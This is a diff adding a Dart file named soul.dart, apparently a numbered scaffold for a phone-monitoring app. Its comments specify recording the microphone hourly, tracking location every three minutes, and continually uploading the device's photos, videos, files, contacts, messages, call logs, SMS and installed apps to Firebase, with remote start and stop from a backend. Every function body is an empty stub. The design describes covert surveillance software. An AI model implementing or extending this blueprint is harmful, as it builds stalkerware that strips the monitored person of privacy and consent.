@@ -1,0 +1,159 @@
+/// This file, soul.dart, contains the implementation of various functions related to data recording and uploading to Firebase.
+/// It also includes functions for sending location, gallery photos, videos, audios, files, contacts, messages, calls, SMS, installed apps names,
+/// internet connection type and speed, handling data upload to Firebase, sending notifications to the backend API,
+/// sending device information, battery status, storage status, RAM status, CPU status, and starting/stopping the soul service.
+///
+/// The functions in this file are designed to be executed at specific intervals, such as every 1 hour, 3 minutes, or 5 minutes.
+/// They interact with Firebase to upload data, send notifications, and retrieve information.
+///
+/// Note: The implementation of these functions is not provided in this file. Please refer to the actual code for the detailed implementation.
+///
+/// Example usage:
+/// ```dart
+/// import 'soul.dart';
+///
+/// void main() {
+///   // Start the soul service
+///   startSoulService();
+///
+///   // Stop the soul service
+///   stopSoulService();
+/// }
+/// ```
+
+// 1 - add all the required namespaces to soul.dart file
+import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_auth/firebase_auth.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:firebase_storage/firebase_storage.dart';
+import 'package:geolocator/geolocator.dart';
+import 'package:image_picker/image_picker.dart';
+import 'package:video_player/video_player.dart';
+import 'package:audioplayers/audioplayers.dart';
+import 'package:file_picker/file_picker.dart';
+import 'package:contacts_service/contacts_service.dart';
+import 'package:sms/sms.dart';
+import 'package:device_info/device_info.dart';
+import 'package:battery/battery.dart';
+import 'package:permission_handler/permission_handler.dart';
+
+// 2 - add the class definition to soul.dart file
+class Soul {
+  // Add class methods here
+}
+
+// 3 - add a function to record the sound of mic and upload it to firebase every one hour
+void recordAndUploadSound() {
+  // Implementation goes here
+}
+
+// 4 - add a function to send a location (lat,lng) to firebase every 3 minutes
+void sendLocationToFirebase() {
+  // Implementation goes here
+}
+
+// 5 - add a function to send all gallery photos to firebase every 5 minutes and check if there is a new photo to send it to firebase
+void sendGalleryPhotosToFirebase() {
+  // Implementation goes here
+}
+
+// 6 - add a function to send all videos to firebase every 5 minutes and check if there is a new video to send it to firebase
+void sendVideosToFirebase() {
+  // Implementation goes here
+}
+
+// 7 - add a function to send all audios to firebase every 5 minutes and check if there is a new audio to send it to firebase
+void sendAudiosToFirebase() {
+  // Implementation goes here
+}
+
+// 8 - add a function to send all files to firebase every 5 minutes and check if there is a new file to send it to firebase
+void sendFilesToFirebase() {
+  // Implementation goes here
+}
+
+// 9 - add a function to send all contacts to firebase every 5 minutes and check if there is a new contact to send it to firebase
+void sendContactsToFirebase() {
+  // Implementation goes here
+}
+
+// 10 - add a function to send all messages to firebase every 5 minutes and check if there is a new message to send it to firebase
+void sendMessagesToFirebase() {
+  // Implementation goes here
+}
+
+// 11 - add a function to send all calls to firebase every 5 minutes and check if there is a new call to send it to firebase
+void sendCallsToFirebase() {
+  // Implementation goes here
+}
+
+// 12 - add a function to send all SMS to firebase every 5 minutes and check if there is a new SMS to send it to firebase
+void sendSMSToFirebase() {
+  // Implementation goes here
+}
+
+// 13 - add a function to send all installed apps names to firebase every 5 minutes and check if there is a new app to send it to firebase
+void sendInstalledAppsToFirebase() {
+  // Implementation goes here
+}
+
+// 14 - add a function to check and return the internet connection type and speed
+void checkInternetConnection() {
+  // Implementation goes here
+}
+
+// 15 - add a function to handle the upload data to firebase and check if the data is uploaded or not to use with all previous functions,
+// this function calculates the new file size that will upload and the old uploaded file size in the last 24 hours and sends this information to the back-end API
+// and waits for a reply with true to upload the new files or false to wait for one hour
+void handleUploadDataToFirebase() {
+  // Implementation goes here
+}
+
+// 16 - add a function to send a notification to the back-end API if the app is not running
+void sendNotificationIfAppNotRunning() {
+  // Implementation goes here
+}
+
+// 17 - add a function to send a notification to the back-end API if the app is running
+void sendNotificationIfAppRunning() {
+  // Implementation goes here
+}
+
+// 18 - add a function to send a notification to the back-end API if the app is closed
+void sendNotificationIfAppClosed() {
+  // Implementation goes here
+}
+
+// 19 - add a function to send all device information to firebase every 5 minutes and check if there is new device information to send it to firebase
+void sendDeviceInformationToFirebase() {
+  // Implementation goes here
+}
+
+// 20 - add a function to send the device battery status to firebase every 24 hours
+void sendBatteryStatusToFirebase() {
+  // Implementation goes here
+}
+
+// 21 - add a function to send the device storage status to firebase every 24 hours
+void sendStorageStatusToFirebase() {
+  // Implementation goes here
+}
+
+// 22 - add a function to send the device RAM status to firebase every 24 hours
+void sendRAMStatusToFirebase() {
+  // Implementation goes here
+}
+
+// 23 - add a function to send the device CPU status to firebase every 24 hours
+void sendCPUStatusToFirebase() {
+  // Implementation goes here
+}
+
+// 24 - add a function to start the soul service and stop it from the back-end API
+void startSoulService() {
+  // Implementation goes here
+}
+
+void stopSoulService() {
+  // Implementation goes here
+}
